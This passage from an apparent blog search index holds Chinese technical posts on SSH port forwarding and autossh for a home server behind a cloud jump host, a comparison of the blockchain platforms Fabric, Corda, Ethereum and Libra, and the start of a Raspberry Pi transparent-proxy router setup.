href=\"https://my.oschina.net/icebergxty/blog/3080748\">Eureka集群部署的踩坑记录</a></li>\n</ul>\n"},{"title":"基于ssh加密隧道的三种端口转发模式","url":"/2020/06/13/%E5%9F%BA%E4%BA%8Essh%E5%8A%A0%E5%AF%86%E9%9A%A7%E9%81%93%E7%9A%84%E4%B8%89%E7%A7%8D%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%A8%A1%E5%BC%8F/","content":"<p>去年购入的腾讯云ECS服务器虽然只有1vCpu、1G内存、40G硬盘，但是Linux服务器的效率就是高，跑个小网站那是杠杠的，不过XunSearch中文索引的磁盘消耗比较大，存储利用率超过95%，需要考虑扩容了。</p>\n<p>本着可劲折腾的原则，最近入手了一台Intel NUC主机，开始琢磨把Linux服务器搬到自己家里的宽带上，ECS只保留一个公网入口（家里宽带都是运营商的浮动私网IP地址，需要保留公网入口作为跳板机），为此潜心研究基于ssh加密隧道实现端口转发。</p>\n<blockquote>\n<pre><code>实际在咸鱼上剁手了两台NUC，新的八代i3作为开发机，二手五代i3作为生产机\n另外，感谢LP赞助了一台Huawei AR111 AccessRouter，彻底改造了家庭网络系统，还有一块即将到货的24寸IPS显示器\n</code></pre>\n</blockquote>\n<p>这里推荐两篇高水平的文章，一是<a href=\"http://www.imooc.com/article/28632\">来自慕课网的精品教材</a>，二是<a href=\"https://abcdabcd987.com/ssh/\">来自UW同学的简明教程</a>，内容已经很丰富准确了，在此衷心表示佩服，并补充几个自己的学习体会，以备日后纪念。</p>\n<h2 id=\"一、区分SSH服务端和Application服务端\"><a href=\"#一、区分SSH服务端和Application服务端\" class=\"headerlink\" title=\"一、区分SSH服务端和Application服务端\"></a>一、区分SSH服务端和Application服务端</h2><p>实际上，端口转发的技术框架中同时存在两对Client&#x2F;Server，分别是Application的客户端和服务器、SSH的客户端和服务器。</p>\n<p>如果Applicaiton的客户端和 SSH 的客户端位于SSH隧道的同一侧，而Applicaiton的服务器和 SSH 服务器位于 SSH 隧道的另一侧，那么这种端口转发类型就是本地端口转发，需要使用<code>-L</code>选项来创建，请参见下图。</p>\n<img src=\"/2020/06/13/%E5%9F%BA%E4%BA%8Essh%E5%8A%A0%E5%AF%86%E9%9A%A7%E9%81%93%E7%9A%84%E4%B8%89%E7%A7%8D%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%A8%A1%E5%BC%8F/ssh-local.jpeg\" class=\"\">\n\n<p>本地转发模式的命令：<code>ssh -L &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH server host&gt;</code></p>\n<p>反之，就是远程端口转发，需要使用<code>-R</code>选项来创建。这也是本次系统改造的基本思路，技术架构见下图  </p>\n<ul>\n<li>本地是SSH的客户端，因为家里的IP地址不固定，公网无法找到私有服务器！！！</li>\n<li>本地是App的服务端，因为Linux服务器和数据搬到了家里</li>\n</ul>\n<img src=\"/2020/06/13/%E5%9F%BA%E4%BA%8Essh%E5%8A%A0%E5%AF%86%E9%9A%A7%E9%81%93%E7%9A%84%E4%B8%89%E7%A7%8D%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%A8%A1%E5%BC%8F/ssh-remote.jpeg\" class=\"\">\n\n<p>远端转发模式的命令：<code>ssh -R &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH server host&gt;</code></p>\n<h2 id=\"二、端口转发的加密技术\"><a href=\"#二、端口转发的加密技术\" class=\"headerlink\" title=\"二、端口转发的加密技术\"></a>二、端口转发的加密技术</h2><p>SSH的安全性比较好，其对数据进行加密的方式主要有两种：对称加密（密钥加密）和非对称加密（公钥加密）。</p>\n<p>对称加密指加密解密使用的是同一套秘钥。Client端把密钥加密后发送给Server端，Server用同一套密钥解密。对称加密的加密强度比较高，很难破解。但是，Client数量庞大，很难保证密钥不泄漏。如果有一个Client端的密钥泄漏，那么整个系统的安全性就存在严重的漏洞。为了解决对称加密的漏洞，于是就产生了非对称加密。</p>\n<p>非对称加密有两个密钥：“公钥”和“私钥”。公钥加密后的密文，只能通过对应的私钥进行解密。想从公钥推理出私钥几乎不可能，所以非对称加密的安全性比较高。SSH的加密原理中，就使用了RSA非对称加密算法。</p>\n<p>整个过程是这样的：</p>\n<ol>\n<li>远程主机收到用户的登录请求，把自己的公钥发给用户。</li>\n<li>用户使用这个公钥，将登录密码加密后，发送回来。</li>\n<li>远程主机用自己的私钥，解密登录密码，如果密码正确，就同意用户登录。</li>\n</ol>\n<img src=\"/2020/06/13/%E5%9F%BA%E4%BA%8Essh%E5%8A%A0%E5%AF%86%E9%9A%A7%E9%81%93%E7%9A%84%E4%B8%89%E7%A7%8D%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%A8%A1%E5%BC%8F/ssh-demo.jpg\" class=\"\">\n\n<p>需要注意的是，图中SSH client和Sever之间的红色通信通道是加密的、安全的，但是其余部分的绿色通道并不是加密的，仍然存在安全风险！</p>\n<p>另外，还可以参见<a href=\"https://blog.caogo.cn/2019/05/04/%E4%B8%BAECS%E8%AE%BE%E7%BD%AEssh%E5%AF%86%E9%92%A5%E7%99%BB%E5%BD%95%E7%9A%84%E6%96%B9%E6%B3%95/\">为ECS设置ssh密钥登录的方法</a></p>\n<h2 id=\"三、SSH命令的几个重要参数\"><a href=\"#三、SSH命令的几个重要参数\" class=\"headerlink\" title=\"三、SSH命令的几个重要参数\"></a>三、SSH命令的几个重要参数</h2><p>除了<code>-L</code> 、<code>-R</code>、<code>-D</code>这三个区别转发模式的核心参数以外，SSH命令还有几个重要的参数：</p>\n<p><code>-f</code>    要求在执行命令前退至后台. 它用于当 准备询问口令或密语, 但是用户希望它在后台进行. 该选项隐含了 <code>-n</code>选项（把 stdin 重定向到 &#x2F;dev&#x2F;null）<br><code>-N</code>    不执行远程命令，仅仅用于转发端口(限协议第二版)，不用再弹回一个新的shell<br><code>-l</code>    指定ssh的login用户名<br><code>-p</code>    指定远程ssh的服务端口<br><code>-g</code>    允许远程主机连接到本地用于转发的端口，划重点！！！：<em><strong>远端转发模式不支持 -g 参数</strong></em></p>\n<pre><code>- 本地转发模式：SSH server host 是 SSH 服务器所在的主机，remote host 和 remote port 则分别指应用程序服务器所在主机和监听端口。如果 remote host 指定为 localhost 则认为应用程序服务器和 SSH 服务器在同一台主机上。应用`-g`选项后,`HOST A`不仅会监听 `localhost` 的 `P`端口，还能够监听所有网络接口的 `P`端口，所以`HOST C` 上的应用客户端就可以把消息发送到`HOSTA` 的 `P` 端口。\n\n- 远端转发模式：由于远端转发模式是在`HOST A`（即SSH Client）上发起命令，但需要基于`HOST B`（也就是SSH Server）提供的`sshd service`，在`HOST B`上建立侦听端口`P`，存在主机权限设置的风险，为此远端转发模式不支持`-g`参数，只能绑定在 `localhost`，也就是只有在`HOST B`的本机才可以访问，而其他外部主机都不能访问。 \n\n- 可能的解决方案：修改`HOST B`(也就是SSH服务器）的配置文件`/etc/ssh/sshd_config` ,在其中添加一行：`GatewayPorts yes`，保存配置文件后，需要重启SSH服务并重新建立隧道，此时就可以接受外部服务的调用了。但是，该方案由于需要`HOST B`对外暴露服务端口，仍然存在一定的风险隐患。 \n\n- 最佳方案是：服务仍然暴露在`localhost`，并采用Nginx反向代理对外服务。\n</code></pre>\n<p>最后，关于SSH命令的全部参数解释，请见<a href=\"http://linux.51yip.com/search/ssh\">参考文档</a>，并列出几个典型的命令示范：</p>\n<pre><code><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh -R 10022:localhost:22 jumpbox</span><br><span class=\"line\">ssh -NR 0.0.0.0:18000:localhost:8000 jumpbox</span><br><span class=\"line\">ssh -NL 20022:localhost:10022 jumpbox</span><br><span class=\"line\">ssh -ND 1080 workplace</span><br></pre></td></tr></table></figure>\n</code></pre>\n<blockquote>\n</blockquote>\n<pre><code>附录：关于在“本地转发，远端转发，动态转发”中提及到的“[bind_address:]port”的补充说明\n\n1、“bind_address”值为“*”或者“为空”中的“为空”，是指这样的形式“:port”，而不是这样的形式“port”\n2、在“ssh_config文件”（在远端转发中，相应的是“sshd_config文件”）中可以配置“GatewayPorts”参数值。当该值为“yes”时，“port”等价于“*:port”；当该值为“no”时，“port”等价于“localhost:port”\n3、在执行ssh命令时，加入“-g”选项，等价于“*:port”的形式\n4、为了更好的可读性和更精准的定义，“bind_address”还是显式配置比较好\n</code></pre>\n<h2 id=\"四、autossh命令\"><a href=\"#四、autossh命令\" class=\"headerlink\" title=\"四、autossh命令\"></a>四、autossh命令</h2><p>实际测试过程中ssh服务并不稳定，经常出现连接中断的现象，于是研究利用<code>autossh</code>软件实现自动重连的功能。</p>\n<ol>\n<li><p>autossh的安装方法<br> 在 Ubuntu 上你可以使用 <code>sudo apt-get install autossh</code> 来安装。<br> 在 Mac 上则是 <code>brew install autossh</code>。</p>\n</li>\n<li><p>autossh的命令语法</p>\n<p> 命令语法：<br> <code>autossh [-V] [-M port[:echo_port]] [-f] [SSH_OPTIONS]</code></p>\n<p> 操作示例：<br> <code>$ autossh -M 5678 -CqTfnN -D 192.168.0.2:7070  freeoa@remote-host</code></p>\n<p> 参数解释：<br> <code>-M</code>                为autossh参数，是服务器echo机制使用的端口，连接出问题了会自动重连<br> <code>-CqTfnN -D</code>        为ssh参数</p>\n<p> 注意：<code>-M 0</code> 意味着关闭心跳监控，如果ssh子进程失败则直接退出autossh。<br> 但是，基于<a href=\"https://www.harding.motd.ca/autossh/README.txt\">autossh的man 文档</a>的说明，最佳实践恰恰是关闭监控，改为<code>autossh</code>命令中增加几个<code>ssh</code>的重要选项，包括<code>ServerAliveInterval</code> 和<code>ServerAliveCountMax</code>，具体示例为：</p>\n<pre><code> <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">autossh -M 0 -fNR 7322:localhost:22 -o ServerAliveInterval=15 -o ServerAliveCountMax=6 root@example.com</span><br></pre></td></tr></table></figure>\n</code></pre>\n</li>\n<li><p>autossh开机自启动的设置方法</p>\n<p> 编辑文本文件 <code>/etc/rc.d/rc.local</code> ，并在里面 <code>exit 0</code> 这句话之前加上<br> <code>su - user -c autossh -NfR 10022:localhost:22 jumpbox</code><br> 其中 user 是你的用户名。</p>\n<p> 在某些条件下，该配置文件可能位置有变化，或者需要赋予可执行权限。<br> 需要注意的是，如果你需要开机时运行 autossh，你需要配置公钥登入，因为开机运行的时候是没有交互界面让你来输入密码的。</p>\n</li>\n<li><p>ssh端口占用情况的检查方法</p>\n<pre><code> <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@local_host ~]<span class=\"comment\"># netstat -an |grep LISTEN</span></span><br><span class=\"line\">......</span><br><span class=\"line\"></span><br><span class=\"line\">[root@local_host ~]<span class=\"comment\"># lsof -i:4010</span></span><br><span class=\"line\">COMMAND   PID    USER   FD   TYPE             DEVICE SIZE/OFF NODE NAME</span><br><span class=\"line\">ssh      6710 lixl    5u  IPv6 0x15699cecfe8a4995      0t0  TCP localhost:altserviceboot (LISTEN)</span><br><span class=\"line\">autossh 46984 lixl    3u  IPv4 0x15699cece41d5e95      0t0  TCP localhost:altserviceboot (LISTEN)</span><br><span class=\"line\">​</span><br><span class=\"line\">[root@remote_host ~]<span class=\"comment\"># lsof -i:8080</span></span><br><span class=\"line\">COMMAND  PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME</span><br><span class=\"line\">sshd    9762 root   10u  IPv4 473994      0t0  TCP *:webcache (LISTEN)</span><br><span class=\"line\">sshd    9762 root   11u  IPv6 473995      0t0  TCP *:webcache (LISTEN)</span><br></pre></td></tr></table></figure>\n</code></pre>\n</li>\n</ol>\n<h2 id=\"五、关于动态端口转发\"><a href=\"#五、关于动态端口转发\" class=\"headerlink\" title=\"五、关于动态端口转发\"></a>五、关于动态端口转发</h2><img src=\"/2020/06/13/%E5%9F%BA%E4%BA%8Essh%E5%8A%A0%E5%AF%86%E9%9A%A7%E9%81%93%E7%9A%84%E4%B8%89%E7%A7%8D%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%A8%A1%E5%BC%8F/ssh-socks5.jpeg\" class=\"\">\n\n<p>通过动态端口转发，实现HTTP Proxy和Sock5 Proxy，这就是科学上网的基本原理，看图即可！<br>有份技术分析报告说的很清楚了，可以参考<a href=\"https://blog.csdn.net/watson2017/article/details/79897693\">HTTP代理和Socks代理的差异分析</a></p>\n<p>哎！这个周末码了这么多字，还亲自配画图，好累啊！！！</p>\n"},{"title":"基于区块链的五种开源技术平台","url":"/2019/11/29/%E5%9F%BA%E4%BA%8E%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9A%84%E4%BA%94%E7%A7%8D%E5%BC%80%E6%BA%90%E6%8A%80%E6%9C%AF%E5%B9%B3%E5%8F%B0/","content":"<p>区块链的本质是DLT，即分布式账本技术（Distributed Ledger Technologies），目前比较活跃的有5个开源软件，分别是Hyperledger Fabric、R3 Corda、Ethereum、Facebook Libra、FISCO BCOS（分别简称为 Fabric、Corda、以太坊、Libra、BCOS）。</p>\n<p>三种不同的框架在可能的应用领域上分别具有完全不同的想法，其中：</p>\n<ul>\n<li>Corda的起源来自于金融服务行业，其业务模型与标准的区块链存在较大差异，可以称之为一个<strong>受区块链启发的开源的分布式账本平台</strong>。</li>\n<li>Fabric设计提供一种模块化、可扩展的架构，可用于从银行、医疗保健到供应链等各个行业。</li>\n<li>以太坊表现出完全独立于任何特定的应用领域。然而以太坊并未突出模块化，而重在为各种交易和应用提供一个通用平台。</li>\n</ul>\n<img src=\"/2019/11/29/%E5%9F%BA%E4%BA%8E%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9A%84%E4%BA%94%E7%A7%8D%E5%BC%80%E6%BA%90%E6%8A%80%E6%9C%AF%E5%B9%B3%E5%8F%B0/640.jpeg\" class=\"\">\n\n<h2 id=\"运行模式（节点之间的地位）\"><a href=\"#运行模式（节点之间的地位）\" class=\"headerlink\" title=\"运行模式（节点之间的地位）\"></a>运行模式（节点之间的地位）</h2><p>在传统的集中式数据存储中，只有一个实体（即Owner，所有者）可以保留账本这一底层数据库的副本，这个Owner控制了全部的数据存储，并决定对其它实体提供什么数据。</p>\n<p>DLT的出现，从根本上改变了集中的数据存储方式，实现了多个实体都拥有底层数据库副本，形成一种由所谓“节点”或“对等端”构成的网络。</p>\n<p>根据网络架构中各个节点的地位是否相同或对等，存在两种不同的运行模式：</p>\n<ul>\n<li><strong>无授权模式</strong>（permissionless）：交易的参与者无需授权，网络中的任何实体都可以参与交易，并获得全量账本。<br>  作为公共区块链的以太坊采用无授权模式。</li>\n<li><strong>有授权模式</strong>（permissioned）：交易的参与者是网络中少数预先选择（授权）的节点，并且仅限于这些参与者维护全量账本，而绝大多数最终用户只能作为Client，以代理或网关方式通过某些特定的授权节点参与交易。<br>  Fabric和 Corda都属于有授权模式。</li>\n</ul>\n<blockquote>\n<p><strong>分布式账本</strong>和<strong>分布式数据库</strong>是两个完全不同的概念，虽然两者在技术上有很多相似之处。<br>从数据所有者的角度来看，TiDB、OceanBase等分布式数据库系统只有一个Owner主体，负责管理多个站点的数据副本；而分布式账本是多个互不信任的主体Owner来共同维护多个数据副本。</p>\n</blockquote>\n<h3 id=\"Corda\"><a href=\"#Corda\" class=\"headerlink\" title=\"Corda\"></a>Corda</h3><img src=\"/2019/11/29/%E5%9F%BA%E4%BA%8E%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9A%84%E4%BA%94%E7%A7%8D%E5%BC%80%E6%BA%90%E6%8A%80%E6%9C%AF%E5%B9%B3%E5%8F%B0/corda.jpeg\" class=\"\">\n\n<p>在Corda的网络结构中，包含多个不同类型的功能节点：</p>\n<ul>\n<li>身份服务节点（绿色节点）：负责全网身份服务的系统节点，实现类似于传统网络架构中的CA（Certificate Authority）功能。该节点负责颁发证书，设置权限，任何想要加入Corda网络的节点都需要从身份服务节点处获得相应身份。</li>\n<li>网络映射服务节点（深蓝色节点）：提供类似于传统网络架构的DNS服务，负责将节点的证书及所提供的服务与其IP地址相关联，便于其它节点进行查询。</li>\n<li>普通用户节点（淡蓝色节点）：普通用户可以自由发起交易。交易产生后，被发送给指定的公证服务节点来验证其唯一性和有效性。如果交易合法，该公证服务节点便对这笔交易签名，并发回交易关联方。交易关联方及公证服务节点各自将该笔交易链接到之前的交易，形成“交易链”，达到交易关联方之间数据的局部统一。</li>\n<li>公证服务节点（黄色节点）：公证服务节点之间通过共识算法来保证全网数据的准确唯一性。Corda计划兼容多种共识算法，由不同的应用场景决定使用何种共识算法，目前提供了基于PBFT&#x2F;RAFT共识算法的公证服务的实现。由于Corda平台的共识是在公证服务节点之间互相达成的，为了减少交易延迟，提升交易吞吐量，开发团队建议将同一个网络的公证服务节点物理上放在一个区域。</li>\n<li>价值中介服务节点（黑色节点）：价值中介服务节点是一种负责和区块链网络外部取得可靠数据的节点。Corda网络可以通过价值中介服务节点获取现实世界的实时数据，从而提供多样化的交易场景。</li>\n</ul>\n<h3 id=\"Fabric\"><a href=\"#Fabric\" class=\"headerlink\" title=\"Fabric\"></a>Fabric</h3><p>与Fabric v0.6相比，v1.0的运行模式有了巨大变化，可以称之为”<strong>伪去中心化</strong>”，最新的v1.4的节点定义为：</p>\n<ul>\n<li>客户节点（Client）：客户节点代表最终用户，创建并调用交易。他们与对等节点和订购节点沟通。</li>\n<li>对等节点（Peer）：对等节点维护账本，并接收订购节点订购的更新消息，以向账本提交新的交易。其中，背书节点（Endorser）是一类特殊的对等节点，任务是通过检查自身是否满足一些必要的和充分的条件（例如提供所需的签名），对交易提供背书。</li>\n<li>排序节点（Orderer）：订购节点在Client和Peer间提供了通信通道，用于广播包含交易的消息。特别是对于共识，这些通道确保了所有已连接的对等节点按照完全相同的逻辑顺序传递完全相同的消息。</li>\n</ul>\n<h3 id=\"Libra\"><a href=\"#Libra\" class=\"headerlink\" title=\"Libra\"></a>Libra</h3><p>Libra也采用有授权模式，协议中有两种类型的节点：</p>\n<ul>\n<li>客户端（client）：client负责发起提交交易，查询信息等，比如钱包就是一个典型的 client。</li>\n<li>验证器（validator）：validators就像是元老会，会轮流着产生提议者（leader），用来将当前的交易定序、打包形成区块，并且共同维护着数据库的一致性。</li>\n</ul>\n<img src=\"/2019/11/29/%E5%9F%BA%E4%BA%8E%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9A%84%E4%BA%94%E7%A7%8D%E5%BC%80%E6%BA%90%E6%8A%80%E6%9C%AF%E5%B9%B3%E5%8F%B0/libra.jpg\" class=\"\">\n\n<h2 id=\"共识算法（多个节点的工作协同）\"><a href=\"#共识算法（多个节点的工作协同）\" class=\"headerlink\" title=\"共识算法（多个节点的工作协同）\"></a>共识算法（多个节点的工作协同）</h2><p>选择无授权或有授权的参与模式，将对达成共识具有深远的影响。</p>\n<p>由于数据是分布式存储（或者，更准确的描述是分布式管理）的，因此难以确保所有节点对一些“共同事实”（例如，账本的正确性）达成一致。因为一个节点所做的更改，必须传播到网络中的所有其它的对等节点上。达成共同事实的结果，称之为节点间的<strong>共识</strong>(consensus)。</p>\n<p>在区块链中，无论参与者是否参与了某个特定的<strong>交易</strong>（Transaction），所有参与者必须就全部已发生交易的顺序达成共识。交易的顺序对账本的一致状态至关重要。如果无法建立明确的交易顺序，那么可能会出现双重支付（double-spends，也叫<strong>双花交易</strong>）问题，即两笔并行交易将同一枚货币转账给了不同的收款人，使其凭空受益。</p>\n<h3 id=\"以太坊\"><a href=\"#以太坊\" class=\"headerlink\" title=\"以太坊\"></a>以太坊</h3><p>由于网络所涉及的各方可能是互不信任的，并且是匿名的，因此必须采用共识机制来保护账本免受双重支付欺诈，或者心怀鬼胎参与者的影响。在目前的以太坊实现中，这种共识机制的建立是使用挖矿方案，也叫<strong>基于工作量的证明</strong>（PoW，Proof of Work）。</p>\n<p>所有参与者必须认同一个共同账本，并且可以访问账本中所有的记录条目。其结果是<strong>PoW</strong>会对交易的处理性能产生不利的影响。尽管记录是匿名的，但是存储在账本中的数据仍然可供所有参与者访问。因此对于有更高隐私度需求的应用而言，这种机制存在问题。</p>\n<h3 id=\"Fabric-1\"><a href=\"#Fabric-1\" class=\"headerlink\" title=\"Fabric\"></a>Fabric</h3><p>Fabric的节点在达成共识的过程中承担了不同的角色和任务，其交易流的的基本步骤为：</p>\n<ol>\n<li>Client向已连接的Endorser（Peer）发送交易，启动对账本的更新。</li>\n<li>所有Endorser都必须就提出的交易达成一致，因此需要根据更新所建议的账本达成某种共识。</li>\n<li>Client依次收集所有Endorser的批准，然后将经批准的交易发送给已连接的Orderer。</li>\n<li>所有Orderer就本批次被批准的交易再次达成共识。</li>\n<li>本批次交易将被转发给持有分类账的Peer，并最终提交交易。</li>\n</ol>\n<p>但由于涉及多个互不信任的订购节点，在传递消息时也可能会出现错误，因此仍然必须引入一致性算法，使得在出现故障（例如，消息顺序不一致）时可以达成一致，从而使分布式账本的复制过程支持容错。</p>\n<p>Fabric所采用的算法是“<strong>可插入的</strong>”，即可以根据特定应用的需求而使用各种算法，不再仅仅局限于基于<strong>PoW</strong>或其它衍生物的挖矿。例如，为了处理如上所述的随机或恶意复制错误，我们可以使用<strong>拜占庭式容错</strong>（BFT）的一种变体算法。</p>\n<p>不同于以太坊，Fabric运行在授权模式下，只有参与交易的节点（Peer &amp; Orderer）才必须要达成共识，因此性能上有了明显提高。此外，由于通道划分了消息流，这意味着Client只能看到它们连接通道中的消息及相关联的交易，而不知道其它通道的情况，因此可为记录提供更细粒度的访问控制，从而增强了隐私。</p>\n<blockquote>\n<p>目前Orderer是用一个中心化的Kafka cluster来做的，所以这里也没有拜占庭容错共识了！但是IBM说，这个地方是留给你自己开发BFT接口的，或者，你付钱给我来开发？？？</p>\n</blockquote>\n<h3 id=\"Corda-1\"><a href=\"#Corda-1\" class=\"headerlink\" title=\"Corda\"></a>Corda</h3><p>类似于 Fabric，Corda 的共识也是在交易层面达成的，仅涉及交易的各方。交易取决于共识是满足<strong>交易合法性</strong>（validity），还是<strong>交易唯一性</strong>（uniqueness）。</p>\n<p>交易合法性通过运行与交易相关联的智能合约代码（智能合约将在下文给出详细介绍），检查需要的所有签名，并确保所引用的任何交易也是有效的。  </p>\n<p>交易唯一性涉及交易的输入状态。具体而言，必须确保有疑问的交易是所有输入状态的唯一消费者。换句话说，不存在任何消耗同一状态的其它交易。这是为了避免产生双重支付。</p>\n<p>实现交易唯一性的共识，是在称为“<strong>公证人</strong>”（Notary）的参与节点中达成的。其中使用的算法和Fabric一样，是“可插拔的”。因此，我们同样可以使用 BFT 算法。</p>\n<h2 id=\"内建代币\"><a href=\"#内建代币\" class=\"headerlink\" title=\"内建代币\"></a>内建代币</h2><p>在区块链技术的应用上，有“币圈”和“链圈”的说法，当然从技术层面，我们并不关心数字货币的炒作，但其中也可能涉及内建代币。</p>\n<p>以太坊提供一种称为“<strong>以太</strong>（Ether）”的内置加密货币。以太用于向帮助通过挖矿达成共识的节点支付奖励，并支付交易费用。因此，去中心化应用（DApps）可以基于支持货币交易的以太坊构建。此外，通过部署符合预定义标准的智能合约，可以创建为用例定制的数字代币。使用这种方式，人们可以定义自己的货币或资产。</p>\n<p>Fabric 和 Corda 不支持通过挖矿达成共识，因此不需要内建的加密货币。但是使用Fabric，也可以开发本地货币，或是带有区块链代码的数字代币，例如Libra。使用 Corda，不建议创建数字货币或代币。</p>\n<h2 id=\"智能合约\"><a href=\"#智能合约\" class=\"headerlink\" title=\"智能合约\"></a>智能合约</h2><p>在第一次接触“智能合约”（smart contract）一词时，人们难免会产生相当大的误解，将其理解为某种智能地表达了某人利益的合约。尽管合约的本质仍然存在含糊不清之处，但是在直观上它似乎应与法律有关。也就是说，我们所关注的合约在本意上并非智能的，至少目前仍尚未由人工智能驱动，也尚未在其中编入具有法律约束力的义务和权利。</p>\n<p>Clark 及其同事在给出“智能合约”这一有用术语时，强调指出了该术语的两种不同的常用方式。第一种方式是智能合约代码（smart contract code），另一种方式是智能法律合约（smart legal contracts）。</p>\n<h3 id=\"以太坊-1\"><a href=\"#以太坊-1\" class=\"headerlink\" title=\"以太坊\"></a>以太坊</h3><p>智能合约代码就是用某种编程语言编写的软件。它作为一个软件代理，或是代表其中某一方，目的是履行某些义务、行使某些权利，并以自动的方式控制分布式账本中的资产。因此，智能合约通过代码执行模拟，或模拟现实世界中合约逻辑，承担了分布式账本的任务和责任，尽管其合法性可能尚未明确。</p>\n<p>所有的DLT都支持以智能合约代码的形式履行智能合约。代码可以使用Go、Java for Fabric、Solidity for Ethereum，以及Java&#x2F;Kotlin for Corda 编写。</p>\n<h3 id=\"Fabric-2\"><a href=\"#Fabric-2\" class=\"headerlink\" title=\"Fabric\"></a>Fabric</h3><p>在Fabirc中使用了术语“<strong>链码</strong>”（chaincode），以此作为智能合约的同义词。</p>\n<h3 id=\"Corda-2\"><a href=\"#Corda-2\" class=\"headerlink\" title=\"Corda\"></a>Corda</h3><p>Corda为确保交易的有效性，会提醒读者在共识机制中使用智能合同代码。同时，Corda的智能合约不仅可以包含代码，还允许包含法律行文（Legal Prose）。因此，上述智能法律合约是法律行文，其制定方式可以通过智能合同代码来表达和实施。</p>\n<p>其背后的基本原理，是赋予植根于相关法律行为的代码以合法性。这种结构称为“Ricardian 合约”。这清晰地表明，Corda 是设计用于金融服务行业这一受严格监管的环境。而 Fabric 和 Ethereum 都不具备此功能。</p>\n<hr>\n<h2 id=\"总结：定制平台-Vs-通用平台\"><a href=\"#总结：定制平台-Vs-通用平台\" class=\"headerlink\" title=\"总结：定制平台 Vs 通用平台\"></a>总结：定制平台 Vs 通用平台</h2><h3 id=\"1-以太坊\"><a href=\"#1-以太坊\" class=\"headerlink\" title=\"1.以太坊\"></a>1.以太坊</h3><p>以太坊是一种强大的智能合约引擎，基本上可作为任何类型应用的通用平台。<br>但是，以太坊的无授权操作模式及全面透明度，是以牺牲性能可扩展性和隐私性为代价的。</p>\n<h3 id=\"2-Fabric\"><a href=\"#2-Fabric\" class=\"headerlink\" title=\"2.Fabric\"></a>2.Fabric</h3><p>Fabric采用有授权的操作模式，即使用 BFT 算法和细粒度访问控制解决了性能可扩展性和隐私问题。<br>此外，Fabric的模块化体系结构使其可以针对众多应用进行定制。我们可将 Fabric 比做一个多功能的工具箱。</p>\n<h3 id=\"3-Corda\"><a href=\"#3-Corda\" class=\"headerlink\" title=\"3.Corda\"></a>3.Corda</h3><p>Corda被设计为一种专门用于金融服务行业的DLT，专注于金融服务交易使Corda得以简化其架构设计，因此Corda可以提供更多的开箱即可用体验。</p>\n<p>值得注意的是，Corda通过增加法律行文的智能合同，考虑了受高度管制的环境。</p>\n<p>不过，Fabric的模块化支持定制类似于Corda的功能集，一些工作力图将Corda纳入Hyperledger项目。因此，不能将Corda视为Fabric的竞争对手，而更多的是一种补充。</p>\n"},{"title":"基于树莓派4B构建支持透明代理的辅助路由器","url":"/2020/07/21/%E5%9F%BA%E4%BA%8E%E6%A0%91%E8%8E%93%E6%B4%BE4B%E6%9E%84%E5%BB%BA%E6%94%AF%E6%8C%81%E9%80%8F%E6%98%8E%E4%BB%A3%E7%90%86%E7%9A%84%E8%BE%85%E5%8A%A9%E8%B7%AF%E7%94%B1%E5%99%A8/","content":"<h2 id=\"基础环境\"><a href=\"#基础环境\" class=\"headerlink\" title=\"基础环境\"></a>基础环境</h2><ul>\n<li>Raspberry Lite OS：   基于ARM V7，32位操作系统</li>\n<li>dnsmasq： 自建域名服务器 + DHCP服务器， 192.168.0.8</li>\n<li>hostapd： 提供AP服务器，SSID&#x3D;xxx-PI， 192.168.11.x&#x2F;24</li>\n<li>clash：   作为v2ray节点的客户端，自带Dashboard</li>\n</ul>\n<p>主路由器： 192.168.0.1</p>\n<p>从路由器：<br>    - eth0： 192.168.0.8<br>    - waln0：192.168.11.1<br>    - DHCP Range： 192.168.11.100-150<br>    - DHCP Default Gateway: 192.168.11.1</p>\n<p>Clash：<br>    - 7890: http&#x2F;https代理端口<br>    - 7891: socks5代理端口<br>    - 7892: 流量重定向端口<br>    - 9090: Dashboard端口<br>    - 53:   内建DNS端口（UDP）</p>\n<p>Clash控制面板：<a href=\"http://192.168.0.8:9090/ui\">http://192.168.0.8:9090/ui</a></p>\n<h2 id=\"安装步骤\"><a href=\"#安装步骤\" class=\"headerlink\" title=\"安装步骤\"></a>安装步骤</h2><h3 id=\"一、安装树莓派并启动\"><a href=\"#一、安装树莓派并启动\" class=\"headerlink\" title=\"一、安装树莓派并启动\"></a>一、安装树莓派并启动</h3><p><strong>Raspbian</strong>是树莓派的官方操作系统，是官基于Debain的深度定制，软件升级策略偏保守，强调稳定第一。<br>桌面版下载链接：<a href=\"http://downloads.raspberrypi.org/raspbian_latest\">http://downloads.raspberrypi.org/raspbian_latest</a><br>Lite 版（无桌面）下载链接：<a href=\"https://downloads.raspberrypi.org/raspbian_lite_latest\">https://downloads.raspberrypi.org/raspbian_lite_latest</a></p>\n<p>树莓派4B的BCM2711芯片采用四核Cortex A72架构，28nm工艺，主频1.5GHz，GPU 500MHz，因此是<code>armv7</code>的技术架构，32位操作系统。<br>虽然树莓派4B宣称已支持64位操作系统，但还在测试阶段；也可以采用Ubuntu、Centos等第三方系统，但软件依赖还是比较麻烦，因此本次安装采用的是Raspberry Lite OS，下载镜像文件是：<code>2020-05-27-raspios-buster-lite-armhf.img</code>。</p>\n<p>采用<strong>Etcher</strong>刻录CF卡，将写好的CF卡插入树莓派，连接有线网卡并加电后，就可以正常启动了。</p>\n<blockquote>\n<p>为避免安全问题，Raspberry 